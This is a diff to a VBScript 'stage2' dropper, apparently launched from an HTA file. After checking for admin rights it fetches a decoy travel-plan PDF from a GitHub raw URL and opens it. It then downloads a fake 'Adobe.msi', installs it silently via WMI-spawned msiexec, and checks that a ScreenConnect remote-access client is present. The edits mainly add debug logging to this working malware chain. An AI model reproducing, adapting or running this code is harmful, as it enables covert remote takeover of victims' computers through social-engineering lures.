@@ -2,11 +2,12 @@ Dim fso, sh, qs, tmp, selfPath, isAdmin, log
 Dim http, stream, msiUrl, msiPath, pid
 Dim wmiSvc, procClass, startup, cmdLine
 Dim pdfUrl, pdfPath, ph, ps
+Dim msiErr, pdfErr, wmiErr
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 qs  = Chr(34)
-tmp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+tmp = sh.ExpandEnvironmentStrings("%TEMP%")
 log = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\stage2_debug.txt"
 
 Dim f
@@ -15,6 +16,7 @@ f.WriteLine "=== stage2 run start ==="
 f.WriteLine "time       : " & Now
 f.WriteLine "user       : " & sh.ExpandEnvironmentStrings("%USERNAME%")
 f.WriteLine "tmp        : " & tmp
+f.WriteLine "tmp exists : " & fso.FolderExists(tmp)
 
 selfPath = location.href
 selfPath = Replace(selfPath, "file:///", "")
@@ -40,7 +42,7 @@ End If
 
 f.WriteLine "-> elevated. proceeding with payload."
 
-' ---- PDF first ----
+' ---------- PDF ----------
 pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = tmp & "\Travel-Meeting-Plan-Q4-2026.pdf"
 
@@ -51,7 +53,9 @@ ph.open "GET", pdfUrl, False
 ph.send
 On Error GoTo 0
 f.WriteLine "pdf status : " & ph.status
+f.WriteLine "pdf body   : " & Len(ph.responseBody) & " bytes"
 
+pdfErr = ""
 If ph.status = 200 Then
     On Error Resume Next
     Set ps = CreateObject("ADODB.Stream")
@@ -59,14 +63,18 @@ If ph.status = 200 Then
     ps.Open
     ps.Write ph.responseBody
     ps.SaveToFile pdfPath, 2
+    If Err.Number <> 0 Then
+        pdfErr = Err.Number & " - " & Err.Description
+        Err.Clear
+    End If
     ps.Close
     On Error GoTo 0
+    f.WriteLine "pdf saveerr: " & pdfErr
+
     If fso.FileExists(pdfPath) Then
         f.WriteLine "pdf saved  : " & fso.GetFile(pdfPath).Size & " bytes"
-        On Error Resume Next
         CreateObject("Shell.Application").ShellExecute pdfPath, "", "", "open", 1
-        f.WriteLine "pdf opened : shell execute call returned"
-        On Error GoTo 0
+        f.WriteLine "pdf opened"
     Else
         f.WriteLine "pdf saved  : FALSE"
     End If
@@ -75,18 +83,21 @@ End If
 f.WriteLine "-> settling 3s"
 sh.Run "%COMSPEC% /c timeout /t 3 /nobreak >nul", 0, True
 
-' ---- MSI ----
+' ---------- MSI ----------
 msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
 msiPath = tmp & "\Adobe.msi"
 
 f.WriteLine "msi fetch  : " & msiUrl
+f.WriteLine "msi path   : " & msiPath
 On Error Resume Next
 Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 http.open "GET", msiUrl, False
 http.send
 On Error GoTo 0
 f.WriteLine "msi status : " & http.status
+f.WriteLine "msi body   : " & Len(http.responseBody) & " bytes"
 
+msiErr = ""
 If http.status = 200 Then
     On Error Resume Next
     Set stream = CreateObject("ADODB.Stream")
@@ -94,8 +105,14 @@ If http.status = 200 Then
     stream.Open
     stream.Write http.responseBody
     stream.SaveToFile msiPath, 2
+    If Err.Number <> 0 Then
+        msiErr = Err.Number & " - " & Err.Description
+        Err.Clear
+    End If
     stream.Close
     On Error GoTo 0
+    f.WriteLine "msi saveerr: " & msiErr
+
     If fso.FileExists(msiPath) Then
         f.WriteLine "msi saved  : " & fso.GetFile(msiPath).Size & " bytes"
     Else
@@ -103,12 +120,14 @@ If http.status = 200 Then
     End If
 End If
 
+' ---------- spawn msiexec ----------
 If fso.FileExists(msiPath) Then
     f.WriteLine "-> spawning msiexec via WMI"
+    wmiErr = ""
     On Error Resume Next
     Set wmiSvc = GetObject("winmgmts:\\.\root\cimv2")
     If Err.Number <> 0 Then
-        f.WriteLine "wmi get    : ERR " & Err.Number & " - " & Err.Description
+        wmiErr = Err.Number & " - " & Err.Description
         Err.Clear
     Else
         Set procClass = wmiSvc.Get("Win32_Process")
@@ -117,25 +136,27 @@ If fso.FileExists(msiPath) Then
         cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn /norestart ALLUSERS=1 /L*v " & qs & tmp & "\msi_install.log" & qs
         procClass.Create cmdLine, Null, startup, pid
         If Err.Number <> 0 Then
-            f.WriteLine "wmi create : ERR " & Err.Number & " - " & Err.Description
+            wmiErr = Err.Number & " - " & Err.Description
             Err.Clear
         Else
             f.WriteLine "wmi create : spawned pid " & pid
         End If
     End If
     On Error GoTo 0
+    f.WriteLine "wmi err    : " & wmiErr
+Else
+    f.WriteLine "-> skipped msiexec spawn (msi not on disk)"
 End If
 
 f.WriteLine "-> waiting 60s for install"
 sh.Run "%COMSPEC% /c timeout /t 60 /nobreak >nul", 0, True
 
-' ---- install verification ----
-Dim probe, svcCheck
+' ---------- checks ----------
+Dim probe, svcCheck, installLog
 probe = "C:\Program Files (x86)\ScreenConnect Client"
 svcCheck = fso.FolderExists(probe)
-f.WriteLine "install check : ScreenConnect folder exists = " & svcCheck
+f.WriteLine "install chk: ScreenConnect folder = " & svcCheck
 
-Dim installLog
 installLog = tmp & "\msi_install.log"
 If fso.FileExists(installLog) Then
     f.WriteLine "msi log    : found, size = " & fso.GetFile(installLog).Size
@@ -143,7 +164,7 @@ Else
     f.WriteLine "msi log    : NOT FOUND"
 End If
 
-f.WriteLine "msi file   : left at " & msiPath
+f.WriteLine "msi final  : exists = " & fso.FileExists(msiPath)
 f.WriteLine "=== end ==="
 f.Close
 
